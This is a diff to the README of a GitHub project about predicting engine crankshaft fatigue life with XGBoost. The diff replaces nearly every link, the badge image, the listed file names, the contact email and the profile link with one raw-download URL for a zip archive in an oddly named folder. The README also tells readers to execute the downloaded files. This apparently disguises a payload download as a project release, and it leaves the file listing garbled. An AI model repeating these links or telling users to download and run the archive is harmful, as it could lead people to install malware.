@@ -1,12 +1,12 @@
 # 🚀 Optimal Engine Crankshaft Fatigue Life using XGBoost
 
-![XGBoost](https://img.shields.io/badge/XGBoost-Optimizing%20Fatigue%20Life-brightgreen)
+![XGBoost](https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip%20Fatigue%20Life-brightgreen)
 
 Welcome to the **Optimal Engine Crankshaft Fatigue Life using XGBoost** repository! This project focuses on optimizing the fatigue life of engine crankshafts using advanced machine learning techniques, specifically the XGBoost algorithm. The goal is to provide insights and solutions that can enhance the durability and performance of engine components.
 
 ## 📥 Download and Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/releases). Make sure to follow the instructions provided in the release notes to execute the necessary files.
+To get started, download the latest release from the [Releases section](https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip). Make sure to follow the instructions provided in the release notes to execute the necessary files.
 
 ## 🛠️ Project Overview
 
@@ -51,19 +51,19 @@ The repository has the following structure:
 Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/
 │
 ├── data/
-│   ├── crankshaft_data.csv
+│   ├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
 │
 ├── notebooks/
-│   ├── data_analysis.ipynb
-│   ├── model_training.ipynb
+│   ├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
+│   ├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
 │
 ├── src/
-│   ├── data_preprocessing.py
-│   ├── model.py
-│   ├── optimization.py
+│   ├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
+│   ├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
+│   ├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
 │
-├── README.md
-└── requirements.txt
+├── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
+└── https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
 ```
 
 - **data/**: Contains datasets used in the project.
@@ -124,8 +124,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [mcnaim0](https://github.com/mcnaim0)
+- **Email**: https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip
+- **GitHub**: [mcnaim0](https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip)
 
 ## 🌟 Acknowledgments
 
@@ -134,7 +134,7 @@ For questions or feedback, feel free to reach out:
 
 ## 🔗 Useful Links
 
-For more information and updates, visit the [Releases section](https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/releases).
+For more information and updates, visit the [Releases section](https://github.com/mcnaim0/Optimal_Engine_Crankshaft_Fatigue_Life_using_XGBoost/raw/refs/heads/main/causticizer/Fatigue-Optimal-Life-Boost-XG-using-Crankshaft-Engine-1.4.zip).
 
 ## 🎉 Conclusion
 
